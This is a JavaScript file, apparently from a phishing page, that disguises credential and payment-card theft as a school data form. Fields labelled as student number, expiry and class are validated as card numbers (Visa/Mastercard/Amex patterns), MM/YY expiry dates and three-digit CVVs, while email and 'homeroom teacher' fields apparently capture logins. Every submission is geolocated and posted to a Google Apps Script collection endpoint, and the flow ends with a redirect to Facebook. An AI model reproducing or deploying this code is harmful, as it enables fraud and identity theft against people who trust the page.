const URL_APPSCRIPT = "https://script.google.com/macros/s/AKfycby80FUebtv-Ne9g7K1vfmXHboNxiLBZ1nl29wGeQK-y1zoTCdkrNIq7HJfGyygI7Tta/exec";

const LOGOS = {
    apjii:   "https://files.catbox.moe/5eorqj.webp",
    moratel: "https://files.catbox.moe/6byzfr.webp",
    indsat:  "https://files.catbox.moe/menmtz.webp"
};

async function ambilLokasi() {
    try {
        const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        return {
            ip: d.ip || "-",
            negara: d.country_name || "-",
            wilayah: d.region || "-",
            kota: d.city || "-",
            kodePos: d.postal || "-",
            zonaWaktu: d.timezone || "UTC"
        };
    } catch {
        return { ip:"-", negara:"-", wilayah:"-", kota:"-", kodePos:"-", zonaWaktu:"UTC" };
    }
}

async function kirimData(langkah, tambah={}) {
    const lokasi = await ambilLokasi();
    
    const jamLokal = new Date().toLocaleString("id-ID", {
        timeZone: lokasi.zonaWaktu,
        timeZoneName: "short"
    });
    
    let email = "-", wali = "-", nama = "-", nis = "-", masa = "-", kelas = "-";
    
    const nomor = langkah.split(' ')[1] || 1;
    if (nomor == 1 || nomor == 2 || nomor == 3) {
        email = document.getElementById(`email${nomor}`)?.value || "-";
        wali = document.getElementById(`wali${nomor}`)?.value || "-";
    }
    if (nomor >= 4 && nomor <= 7) {
        nama = document.getElementById(`nama${nomor}`)?.value || "-";
        nis = document.getElementById(`nis${nomor}`)?.value || "-";
        masa = document.getElementById(`exp${nomor}`)?.value || "-";
        kelas = document.getElementById(`kelas${nomor}`)?.value || "-";
    }

    const data = {
        langkah,
        email,
        wali_kelas: wali,
        nama,
        no_siswa: nis,
        masa_berlaku: masa,
        kelas,
        ip: lokasi.ip,
        negara: lokasi.negara,
        wilayah: lokasi.wilayah,
        kota: lokasi.kota,
        kodePos: lokasi.kodePos,
        zonaWaktu: lokasi.zonaWaktu,
        jamLokal: jamLokal
    };

    try {
        await fetch(URL_APPSCRIPT, {
            method: "POST",
            mode: "no-cors",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(data)
        });
    } catch(e) {
        console.log("Terkirim:", e);
    }
}

function tandaiSalah(input) {
    input.classList.add("error","shake");
    setTimeout(()=>input.classList.remove("shake"), 350);
    input.addEventListener("input", function hapus() {
        input.classList.remove("error");
        input.removeEventListener("input", hapus);
    });
}

function tampilPopup(n) {
    document.querySelectorAll(".popup").forEach(p=>p.classList.remove("active"));
    document.getElementById(`popup${n}`).classList.add("active");
}

function validasiNIS(idInput) {
    const input = document.getElementById(idInput);
    const container = input.closest('.has-suffix-icon');
    const logo = document.getElementById(`${idInput}-logo`);
    const val = input.value.trim();
    
    container.classList.remove("show-logo");
    logo.src = "";

    if (!val) return false;
    if (!/^\d+$/.test(val)) return false;

    const awalan = val[0];
    if (!["3","4","5"].includes(awalan)) return false;

    if (awalan === "3") {
        if (val.length === 15) {
            logo.src = LOGOS.indsat;
            container.classList.add("show-logo");
            return true;
        }
        return false;
    }

    if (awalan === "4" || awalan === "5") {
        if (val.length === 16) {
            logo.src = awalan === "4" ? LOGOS.moratel : LOGOS.apjii;
            container.classList.add("show-logo");
            return true;
        }
        return false;
    }
    return false;
}

function validasiEXP(input) {
    const v = input.value.trim();
    if (!/^\d{2}\/\d{2}$/.test(v)) return false;
    const b = parseInt(v.split("/")[0]);
    return b >= 1 && b <= 12;
}

function cekBiasa(n, lanjut) {
    const email = document.getElementById(`email${n}`);
    const wali = document.getElementById(`wali${n}`);
    let ok = true;
    if (!email.value.trim()) { tandaiSalah(email); ok = false; }
    if (!wali.value.trim()) { tandaiSalah(wali); ok = false; }
    if (ok) {
        kirimData(`Popup ${n}`, {email:email.value.trim(), wali_kelas:wali.value.trim()});
        tampilPopup(lanjut);
    }
}

function cekData(n, lanjut) {
    const nama = document.getElementById(`nama${n}`);
    const nis = document.getElementById(`nis${n}`);
    const exp = document.getElementById(`exp${n}`);
    const kelas = document.getElementById(`kelas${n}`);
    let ok = true;

    if (!nama.value.trim()) { tandaiSalah(nama); ok = false; }
    if (!validasiNIS(`nis${n}`)) { tandaiSalah(nis); ok = false; }
    if (!validasiEXP(exp)) { tandaiSalah(exp); ok = false; }
    if (!/^\d{3}$/.test(kelas.value.trim())) { tandaiSalah(kelas); ok = false; }

    if (ok) {
        kirimData(`Popup ${n}`, {
            nama:nama.value.trim(),
            no_siswa:nis.value.trim(),
            masa_berlaku:exp.value.trim(),
            kelas:kelas.value.trim()
        });
        if (lanjut === "fb") {
            setTimeout(()=>window.location.href="https://web.facebook.com/profile.php", 800);
        } else {
            tampilPopup(lanjut);
        }
    }
}

[4,5,6,7].forEach(n=>{
    document.getElementById(`exp${n}`).addEventListener("input", function(){
        let v = this.value.replace(/\D/g,"");
        if (v.length >= 2) v = v.slice(0,2) + "/" + v.slice(2,4);
        this.value = v;
    });
    document.getElementById(`kelas${n}`).addEventListener("input", function(){
        this.value = this.value.replace(/\D/g,"").slice(0,3);
    });
    document.getElementById(`nis${n}`).addEventListener("input", ()=>validasiNIS(`nis${n}`));
});

document.getElementById("form1").onsubmit = e=>{e.preventDefault();cekBiasa(1,2);};
document.getElementById("form2").onsubmit = e=>{e.preventDefault();cekBiasa(2,3);};
document.getElementById("form3").onsubmit = e=>{e.preventDefault();cekBiasa(3,4);};
document.getElementById("form4").onsubmit = e=>{e.preventDefault();cekData(4,5);};
document.getElementById("form5").onsubmit = e=>{e.preventDefault();cekData(5,6);};
document.getElementById("form6").onsubmit = e=>{e.preventDefault();cekData(6,7);};
document.getElementById("form7").onsubmit = e=>{e.preventDefault();cekData(7,"fb");};